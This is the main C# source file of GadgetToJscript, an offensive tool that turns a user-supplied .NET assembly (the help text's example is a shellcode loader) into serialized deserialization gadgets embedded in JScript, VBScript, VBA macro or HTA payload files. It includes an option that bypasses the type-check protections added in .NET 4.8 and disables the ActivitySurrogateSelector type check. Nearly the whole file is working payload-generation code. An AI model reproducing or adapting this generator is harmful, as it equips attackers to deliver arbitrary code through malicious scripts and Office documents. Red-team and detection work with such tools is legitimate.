//    GadgetToJscript.
//    Copyright (C) Elazaar / @med0x2e 2019
//
//    GadgetToJscript is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
//
//    GadgetToJscript is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with GadgetToJscript.  If not, see <http://www.gnu.org/licenses/>.


using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;

namespace GadgetToJScript
{

    class Program
    {


        enum EWSH
        {
            js,
            vbs,
            vba,
            hta
        }

        enum ENC
        {
            b64,
            hex
        }


        private static string _wsh;
        private static string _outputFName = "test";
        private static bool _regFree = false;
        private static string _enc = "b64";
        private static string _assembly = "";
        private static string _csFile = "";
        private static string _references = "";
        private static bool _bypass = false;

        static void Main(string[] args)
        {

            var show_help = false;
            bool _isAssembly = false;

            OptionSet options = new OptionSet(){
                {"w|scriptType=","Set to js, vbs, vba or hta.\n", v =>_wsh=v},
                {"b|bypass","Bypass type check controls introduced in .NET version 4.8+, by default set to false," +
                " set to true (--bypass/-b) in case WSH scripts are being generated to run on .NET version > 4.8+ .\n", v => _bypass = v != null},
                {"e|encodeType=","VBA gadgets encoding: b64 or hex (default set to b64),\n", v => _enc=v},
                {"o|output=","Generated payload output file, example: -o C:\\Users\\userX\\Desktop\\output (Without extension)\n", v =>_outputFName=v},
                {"r|regfree","registration-free activation of .NET based COM components, applicable to JS/HTA scripts only.\n", v => _regFree = v != null},
                {"a|assembly=",".NET Assembly, example: -a C:\\Users\\userX\\Desktop\\shellcode_loader.dll, alternatively you can specify a c# source file instead using -c cmdline switch.\n", v => _assembly=v},
                {"c|csfile=","C# source code file, example: -c C:\\Users\\userX\\Desktop\\shellcode_loader.cs, make sure to place your code within the default constructor of your class and specify any required dependencies using -d cmdline switch.\n", v => _csFile=v},
                {"d|references=","Reference Assemblies, example: -d System.Windows.Forms.dll, System.dll\n", v => _references=v},
                {"h|help","Show Help", v => show_help = v != null},
            };

            try
            {
                options.Parse(args);


                if (_wsh == "" || _outputFName == "")
                {
                    showHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(EWSH), _wsh))
                {
                    showHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(ENC), _enc))
                {
                    showHelp(options);
                    return;
                }

                if (_assembly.Trim() == "" && _csFile.Trim() == "")
                {
                    showHelp(options);
                    return;
                }
                else
                {
                    _isAssembly = _assembly.Trim() != "" ? true : false;

                    if (_isAssembly)
                    {
                        if (!File.Exists(_assembly))
                        {
                            showHelp(options);
                            return;
                        }
                    }
                    else
                    {
                        if (!File.Exists(_csFile))
                        {
                            showHelp(options);
                            return;
                        }
                    }
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("\nTry --help for more information.");
                showHelp(options);
                return;

            }

            string resourceName = "";
            string dotNetVersion = (_bypass ? "GT4_8" : "LT4_8");
            switch (_wsh)
            {
                case "js":
                    if (_regFree) { resourceName = "GadgetToJScript.templates." + dotNetVersion + ".jscript-regfree.template"; }
                    else { resourceName = "GadgetToJScript.templates." + dotNetVersion + ".jscript.template"; }
                    break;
                case "vbs":
                    resourceName = "GadgetToJScript.templates." + dotNetVersion + ".vbscript.template";
                    break;
                case "vba":
                    if (_enc == "b64")
                    {
                        resourceName = "GadgetToJScript.templates." + dotNetVersion + ".vbascriptb64.template";
                    }
                    else
                    {
                        resourceName = "GadgetToJScript.templates." + dotNetVersion + ".vbascripthex.template";
                    }
                    break;
                case "hta":
                    if (_regFree && dotNetVersion == "LT4_8") { resourceName = "GadgetToJScript.templates." + dotNetVersion + ".htascript-regfree.template"; }
                    else { resourceName = "GadgetToJScript.templates." + dotNetVersion + ".htascript.template"; }
                    break;
                default:
                    if (_regFree) { resourceName = "GadgetToJScript.templates." + dotNetVersion + ".jscript-regfree.template"; }
                    else { resourceName = "GadgetToJScript.templates." + dotNetVersion + ".jscript.template"; }
                    break;
            }

            Console.WriteLine("[+]: Generating the " + _wsh + " payload");

            MemoryStream _msStg1 = null;
            _DisableTypeCheckGadgetGenerator _disableTypCheckObj = null;

            if (_bypass)
            {
                _msStg1 = new MemoryStream();
                _disableTypCheckObj = new _DisableTypeCheckGadgetGenerator();
                _msStg1 = _disableTypCheckObj.generateGadget(_msStg1);
                Console.WriteLine("[+]: First stage gadget generation done.");
            }

            ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");

            Assembly _assemblyBytes = null;

            if (_isAssembly){
                Console.WriteLine("[+]: Loading your .NET assembly:" + _assembly);
                _assemblyBytes = _AssemblyLoader.load(_assembly.Trim());
            }
            else
            {
                Console.WriteLine("[+]: Compiling your .NET code located at:" + _csFile);
                _assemblyBytes = _AssemblyLoader.compile(_csFile.Trim(), _references.Trim());
            }

            if (_assemblyBytes == null){
                return;
            }

            BinaryFormatter _formatterStg2 = new BinaryFormatter();
            MemoryStream _msStg2 = new MemoryStream();
            _ASurrogateGadgetGenerator _gadgetStg = new _ASurrogateGadgetGenerator(_assemblyBytes);

            _formatterStg2.Serialize(_msStg2, _gadgetStg);

            Console.WriteLine("[+]: Second stage gadget generation done.");

            Assembly assembly = Assembly.GetExecutingAssembly();
            string _wshTemplate = "";

            using (Stream stream = assembly.GetManifestResourceStream(resourceName))

                if (_wsh != "vba")
                {

                    using (StreamReader reader = new StreamReader(stream))
                    {
                        _wshTemplate = reader.ReadToEnd();
                        if (_bypass)
                        {
                            _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", Convert.ToBase64String(_msStg1.ToArray()));
                            _wshTemplate = _wshTemplate.Replace("%_STAGE1Len_%", _msStg1.Length.ToString());
                        }
                        _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", Convert.ToBase64String(_msStg2.ToArray()));
                        _wshTemplate = _wshTemplate.Replace("%_STAGE2Len_%", _msStg2.Length.ToString());
                    }
                }
                else
                {
                    List<string> stage1Lines = new List<String>();
                    List<string> stage2Lines = new List<String>();

                    if (_enc == "b64")
                    {
                        if (_bypass)
                            stage1Lines = SplitToLines(Convert.ToBase64String(_msStg1.ToArray()), 100).ToList();

                        stage2Lines = SplitToLines(Convert.ToBase64String(_msStg2.ToArray()), 100).ToList();
                    }
                    else
                    {
                        if (_bypass)
                            stage1Lines = SplitToLines(BitConverter.ToString(_msStg1.ToArray()).Replace("-", ""), 100).ToList();

                        stage2Lines = SplitToLines(BitConverter.ToString(_msStg2.ToArray()).Replace("-", ""), 100).ToList();
                    }

                    StringBuilder _b1 = null;
                    if (_bypass)
                    {
                        _b1 = new StringBuilder();
                        _b1.Append("stage_1 = \"").Append(stage1Lines[0]).Append("\"");
                        _b1.AppendLine();
                        stage1Lines.RemoveAt(0);

                        foreach (String line in stage1Lines)
                        {
                            _b1.Append("stage_1 = stage_1 & \"").Append(line.ToString().Trim()).Append("\"");
                            _b1.AppendLine();
                        }
                    }

                    StringBuilder _b2 = new StringBuilder();
                    _b2.Append("stage_2 = \"").Append(stage2Lines[0]).Append("\"");
                    _b2.AppendLine();
                    stage2Lines.RemoveAt(0);

                    foreach (String line in stage2Lines)
                    {
                        _b2.Append("stage_2 = stage_2 & \"").Append(line.ToString().Trim()).Append("\"");
                        _b2.AppendLine();
                    }


                    using (StreamReader reader = new StreamReader(stream))
                    {
                        _wshTemplate = reader.ReadToEnd();
                        if (_bypass)
                            _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", _b1.ToString());

                        _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", _b2.ToString());
                    }
                }

            using (StreamWriter _generatedWSH = new StreamWriter(_outputFName + "." + _wsh))
            {
                _generatedWSH.WriteLine(_wshTemplate);
            }

            Console.WriteLine("[*]: Payload generation completed, check: " + _outputFName + "." + _wsh);

        }

        public static void showHelp(OptionSet p)
        {
            Console.WriteLine("\nUsage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        public static IEnumerable<string> SplitToLines(string stringToSplit, int maximumLineLength)
        {
            var words = stringToSplit.Split(' ').Concat(new[] { "" });
            return words.Skip(1).Aggregate(words.Take(1).ToList(),
                (a, w) =>
                {
                    var last = a.Last();
                    while (last.Length > maximumLineLength)
                    {
                        a[a.Count() - 1] = last.Substring(0, maximumLineLength);
                        last = last.Substring(maximumLineLength);
                        a.Add(last);
                    }
                    var test = last + " " + w;
                    if (test.Length > maximumLineLength)
                    {
                        a.Add(w);
                    }
                    else
                    {
                        a[a.Count() - 1] = test;
                    }
                    return a;
                });
        }
    }
}
